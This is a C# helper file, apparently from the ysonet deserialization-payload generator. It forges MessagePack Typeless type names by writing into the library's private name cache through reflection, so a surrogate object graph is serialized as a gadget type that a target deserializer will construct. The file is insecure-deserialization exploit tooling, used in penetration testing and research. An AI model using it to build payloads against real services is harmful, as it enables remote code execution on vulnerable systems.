namespace ysonet.Helpers
{
    using MessagePack;
    using MessagePack.Formatters;
    using MessagePack.Resolvers;
    using System;
    using System.Collections.Generic;
    using System.Reflection;

    /// <summary>
    /// Builds a MessagePack Typeless payload for types this process must never construct,
    /// without knowing anything about any gadget.
    ///
    /// A gadget whose sink is a property SETTER cannot serialize its real target: setting
    /// the property IS the effect, so it would fire inside ysonet. The same is true for a
    /// chain whose getter runs on assignment. So the gadget builds a SURROGATE graph with
    /// the same property names and hands it here with a map of surrogate type -> the
    /// assembly qualified name the target must read.
    ///
    /// MessagePack Typeless writes the type name of every object from a private static
    /// name cache (TypelessFormatter.FullTypeNameCache) keyed by Type, so seeding that
    /// cache with the target's name makes the serializer emit it while still walking the
    /// surrogate's own properties. This is the MessagePack twin of
    /// SharpSerializerTypeSwap, which solves the same problem for the SharpSerializer
    /// binary type-name cache.
    ///
    /// The surrogate shapes and the target names stay in the gadget that owns them (see
    /// Generators/README.md); nothing gadget specific belongs in this file.
    /// </summary>
    internal static class MessagePackTypelessTypeSwap
    {
        /// <summary>
        /// Serialize <paramref name="surrogateGraph"/> with the Typeless resolver, after
        /// pointing every surrogate type in <paramref name="targetTypeNames"/> at the
        /// assembly qualified name the target deserializer must see.
        /// </summary>
        /// <param name="surrogateGraph">The root of the surrogate object graph.</param>
        /// <param name="targetTypeNames">Surrogate type -> target assembly qualified name.</param>
        /// <param name="useLz4">Compress. Works for both Lz4Block and Lz4BlockArray.</param>
        internal static byte[] SerializeAs(
            object surrogateGraph,
            IDictionary<Type, string> targetTypeNames,
            bool useLz4)
        {
            if (surrogateGraph == null)
                throw new ArgumentNullException("surrogateGraph");
            if (targetTypeNames == null || targetTypeNames.Count == 0)
                throw new ArgumentException(
                    "At least one surrogate type -> target type name mapping is required.",
                    "targetTypeNames");

            SwapTypeCacheNames(targetTypeNames);
            return MessagePackSerializer.Serialize(surrogateGraph, Options(useLz4));
        }

        /// <summary>
        /// One-type convenience form of <see cref="SerializeAs(object, IDictionary{Type, string}, bool)"/>,
        /// for a surrogate that carries no nested swapped types.
        /// </summary>
        internal static byte[] SerializeAs(
            object surrogate,
            string targetAssemblyQualifiedName,
            bool useLz4)
        {
            if (surrogate == null)
                throw new ArgumentNullException("surrogate");
            if (string.IsNullOrEmpty(targetAssemblyQualifiedName))
                throw new ArgumentException("A target assembly qualified name is required.",
                    "targetAssemblyQualifiedName");

            var map = new Dictionary<Type, string>();
            map.Add(surrogate.GetType(), targetAssemblyQualifiedName);
            return SerializeAs(surrogate, map, useLz4);
        }

        /// <summary>
        /// Read a Typeless payload back, for the -t self-test.
        /// </summary>
        internal static object Deserialize(byte[] serializedData, bool useLz4)
        {
            return MessagePackSerializer.Deserialize<object>(serializedData, Options(useLz4));
        }

        private static MessagePackSerializerOptions Options(bool useLz4)
        {
            return useLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;
        }

        /// <summary>
        /// Add entries to the private static FullTypeNameCache that MessagePack consults for
        /// the type name of an object it is about to write. A cache hit skips the real name,
        /// so the surrogate is written under the target's name.
        /// </summary>
        private static void SwapTypeCacheNames(IDictionary<Type, string> targetTypeNames)
        {
            FieldInfo cacheField = typeof(TypelessFormatter).GetField(
                "FullTypeNameCache",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (cacheField == null)
                throw new Exception(
                    "MessagePack's TypelessFormatter.FullTypeNameCache is gone. The library layout "
                    + "changed; the typeless type swap needs revisiting.");

            object cache = cacheField.GetValue(TypelessFormatter.Instance);
            MethodInfo tryAdd = cacheField.FieldType.GetMethod(
                "TryAdd",
                new[] { typeof(Type), typeof(byte[]) });
            if (tryAdd == null)
                throw new Exception(
                    "MessagePack's type name cache no longer exposes TryAdd(Type, byte[]). The library "
                    + "layout changed; the typeless type swap needs revisiting.");

            foreach (KeyValuePair<Type, string> swap in targetTypeNames)
            {
                tryAdd.Invoke(
                    cache,
                    new object[]
                    {
                        swap.Key,
                        System.Text.Encoding.UTF8.GetBytes(swap.Value)
                    });
            }
        }
    }
}
